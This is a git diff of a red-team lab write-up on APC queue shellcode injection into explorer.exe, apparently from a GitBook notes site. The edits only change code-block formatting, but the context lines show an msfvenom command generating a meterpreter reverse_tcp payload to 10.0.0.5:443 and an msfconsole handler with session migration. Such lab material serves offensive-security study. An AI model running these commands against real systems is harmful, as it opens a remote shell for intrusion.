@@ -27,13 +27,11 @@ A high level overview of how this lab works:
 
 Let's start by creating a meterpreter shellcode to be injected into the victim process:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/annotation-2019-05-26-111814.png)
 
@@ -59,14 +57,12 @@ Back to the code - we can now enumerate all threads of explorer.exe and queue an
 
 Switching gears to the attacking machine - let's fire up a multi handler and set an `autorunscript` to migrate meterpreter sessions to some other process before they die with the dying threads:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/x64/meterpreter/reverse_tcp; exploit"
 set autorunscript post/windows/manage/migrate
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 Once the `apcqueue` is compiled and run,  a meterpreter session is received - the technique worked:
 
@@ -111,8 +107,7 @@ Note that the injected powershell process becomes unresponsive.
 
 ## Code
 
-{% code-tabs %}
-{% code-tabs-item title="apcqueue.cpp" %}
+{% code title="apcqueue.cpp" %}
 ```cpp
 #include "pch.h"
 #include <iostream>
@@ -160,8 +155,7 @@ int main()
 	return 0;
 }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 ## References
 
